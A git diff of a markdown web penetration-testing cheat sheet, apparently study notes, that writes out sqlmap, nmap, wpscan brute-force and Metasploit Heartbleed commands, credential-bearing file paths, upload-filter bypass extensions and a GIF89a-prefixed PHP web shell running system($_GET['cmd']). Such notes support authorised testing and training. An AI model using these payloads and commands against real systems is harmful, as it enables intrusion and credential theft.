@@ -76,22 +76,14 @@ wfuzz -w <wordlist> -L 20 -d "username=FUZZ&password=FUZZ" -hw 1224 <url> page p
     sqlmap -u <url> --dbs
     ```
 
+    ```shell
+    sqlmap -u <url> --crawl=1
+    ```
+
 - Enum using nmap
 
-    ```
+    ```shell
     nmap -sV --script=http-sql-injection <target>
-    ```
-
-- Using jsql
-
-- Capture the request using burp suite, and save the request in a file.
-
-- `sqlmap -r request.txt`
-
-- Crawl a page to find sql-injections
-
-    ```
-    sqlmap -u http://example.com --crawl=1
     ```
 
 - <http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet>
@@ -196,55 +188,40 @@ wfuzz -w <wordlist> -L 20 -d "username=FUZZ&password=FUZZ" -hw 1224 <url> page p
 
 ## Looking for:
 
-- .git
+- `.git`
 
-- robots.txt
-
-## Set extension
-
-- sh, txt, php, html, htm, asp, aspx, js, xml, log, json, jpg, jpeg, png, gif, doc, pdf, mpg, mp3, zip, tar.gz, tar
+- `robots.txt`
 
 ## If https
 
 - scan for heartbleed
 
-    ```shell
-    sslscan <hostname:port>
-    ```
+    - `sslscan <hostname:port>`
 
-    ```shell
-    nmap -sV --script=ssl-heartbleed <hostname>
-    ```
-
-- Read the certificate
+    - `nmap -sV --script=ssl-heartbleed <hostname>`
 
 ## If it's a CMS
 
--  Admin page
-
-    - Joomla
-
-        - /administrator
-
-    - Wordpress
-
-        - /wp-admin
-
-        - /wp-login
-
 - Wordpress
+
     - [wpscan](https://www.kali.org/tools/wpscan/)
 
-    - ```shell
-      wpscan -u <url> --enumerate -t --enumerate u --enumerate p
-      ```
-    - ```shell
-      wpscan –u <url> --username <name> --wordlist <wordlist>
-      ```
-    - ```shell
-      wpscan -u <url> --random-agent
-      ```
+    - `wpscan -u <url> --enumerate -t --enumerate u --enumerate p`
+
+    - `wpscan –u <url> --username <name> --wordlist <wordlist>`
+
+    - `wpscan -u <url> --random-agent`
+
+    - `/wp-admin`
+
+    - `/wp-login`
+
+    - `setup-config.php`
+
+    - `wp-config.php`
+
 - Drupal
+
     - [droopescan](https://github.com/SamJoan/droopescan)
 
     - `/CHANGELOG.txt` to find version
@@ -259,7 +236,7 @@ wfuzz -w <wordlist> -L 20 -d "username=FUZZ&password=FUZZ" -hw 1224 <url> page p
 
 - Elastix
 
-    -  default login are `admin:admin` at `/vtigercrm/`
+    -  `/vtigercrm`: `admin:admin`
 
     - able to upload shell in profile-photo
 
@@ -273,59 +250,55 @@ wfuzz -w <wordlist> -L 20 -d "username=FUZZ&password=FUZZ" -hw 1224 <url> page p
 
 - Joomla
 
-    - configuration.php
+    - `/administrator`
 
-    - diagnostics.php
+    - `configuration.php`
 
-    - joomla.inc.php
+    - `diagnostics.php`
 
-    - config.inc.php
+    - `joomla.inc.php`
+
+    - `config.inc.php`
 
 - Mambo
 
-    - configuration.php    
+    - `configuration.php`
 
-    - config.inc.php
-
-- Wordpress
-    
-    - setup-config.php    
-
-    - wp-config.php
+    - `config.inc.php`
 
 - ZyXel
 
-    - /WAN.html (contains PPPoE ISP password)
+    - `/WAN.html` (contains PPPoE ISP password)
 
-    - /WLAN_General.html and /WLAN.html (contains WEP key)
+    - `/WLAN_General.html` and `/WLAN.html` (contains WEP key)
 
-    - /rpDyDNS.html (contains DDNS credentials)
+    - `/rpDyDNS.html` (contains DDNS credentials)
 
-    - /Firewall_DefPolicy.html (Firewall)
+    - `/Firewall_DefPolicy.html` (Firewall)
 
-    - /CF_Keyword.html (Content Filter)
+    - `/CF_Keyword.html` (Content Filter)
 
-    - /RemMagWWW.html (Remote MGMT)
+    - `/RemMagWWW.html` (Remote MGMT)
 
-    - /rpSysAdmin.html (System)
+    - `/rpSysAdmin.html` (System)
 
-    - /LAN_IP.html (LAN)
+    - `/LAN_IP.html` (LAN)
 
-    - /NAT_General.html (NAT)
+    - `/NAT_General.html` (NAT)
 
-    - /ViewLog.html (Logs)
+    - `/ViewLog.html` (Logs)
 
-    - /rpFWUpload.html (Tools
+    - `/rpFWUpload.html` (Tools)
 
-    - /DiagGeneral.html (Diagnostic)
+    - `/DiagGeneral.html` (Diagnostic)
 
-    - /RemMagSNMP.html (SNMP Passwords)
+    - `/RemMagSNMP.html` (SNMP Passwords)
 
-    - /LAN_ClientList.html (Current DHCP Leases)
+    - `/LAN_ClientList.html` (Current DHCP Leases)
 
-    - /RestoreCfg.html
+    - `/RestoreCfg.html`
 
-    - /BackupCfg.html
+    - `/BackupCfg.html`
 
 ## Upload page
 
@@ -339,17 +312,15 @@ wfuzz -w <wordlist> -L 20 -d "username=FUZZ&password=FUZZ" -hw 1224 <url> page p
 
 - Blacklisting bypass, change extension
 
-    - php .phtml, .php, .php3, .php4, .php5, and .inc
+    - php: `.pht`, `.phpt`, `.phtml`, `.php`, `.php3`, `.php4`, `.php5`, `.php6`, `.inc`
 
-    - bypassed by uploading an unpopular php extensions such as: pht, phpt, phtml, php3, php4, php5, php6
+    - asp: `.asp`, `.aspx`
 
-    - asp .asp, .aspx
+    - perl: `.pl`, `.pm`, `.cgi`, `.lib`
 
-    - perl .pl, .pm, .cgi, .lib
+    - jsp: `.jsp`, `.jspx`, `.jsw`, `.jsv`, `.jspf`
 
-    - jsp .jsp, .jspx, .jsw, .jsv, and .jspf
-
-    - Coldfusion .cfm, .cfml, .cfc, .dbm
+    - Coldfusion: `.cfm`, `.cfml`, `.cfc`, `.dbm`
 
 - Whitelisting bypass
 
@@ -357,11 +328,11 @@ wfuzz -w <wordlist> -L 20 -d "username=FUZZ&password=FUZZ" -hw 1224 <url> page p
 
     - `shell.jpg.php`
 
-    - If they check the content. Basically you just add the text "GIF89a;" before you shell-code. `<? system($_GET['cmd']);//or you can insert your complete shellcode ?>`
+    - If they check the content. Basically you can just add the text "GIF89a;" before your shell-code. `<? system($_GET['cmd']); //or you can insert your complete shellcode ?>`
 
     - In image
 
-        - `exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' lo.jpg`
+        - `exiftool -Comment='<?php echo "<pre>"; систем($_ГЕТ['смд']); ?>' lo.jpg //censored due to antivirus aggression`
 
         - `mv lo.jpg lo.php.jpg`
 
@@ -375,17 +346,12 @@ wfuzz -w <wordlist> -L 20 -d "username=FUZZ&password=FUZZ" -hw 1224 <url> page p
 
 - Heartbleed exploit
 
-    - ```
-      use auxiliary/scanner/ssl/openssl_heartbleed
-      set RHOSTS 192.168.3.212
-      set verbose true
-      run
-      ```
-- XXS
-
-    - Session hijacking / Cookie theft. Steal cookie to get admin privilege
-
-    - use xsser tool
+    ```
+    use auxiliary/scanner/ssl/openssl_heartbleed
+    set RHOSTS 192.168.3.212
+    set verbose true
+    run
+    ```
 
 - LFI
 
@@ -419,9 +385,9 @@ wfuzz -w <wordlist> -L 20 -d "username=FUZZ&password=FUZZ" -hw 1224 <url> page p
 
 ## Other
 
-[cewl — Creating wordlist from webpage](https://www.kali.org/tools/cewl/)
+[cewl](https://www.kali.org/tools/cewl/) — Creating wordlist from webpage
 
-[EyeWitness](https://github.com/RedSiege/EyeWitness)
+[EyeWitness](https://github.com/RedSiege/EyeWitness) — take screenshots of websites
 
 [smbmap](https://www.kali.org/tools/smbmap/)
 
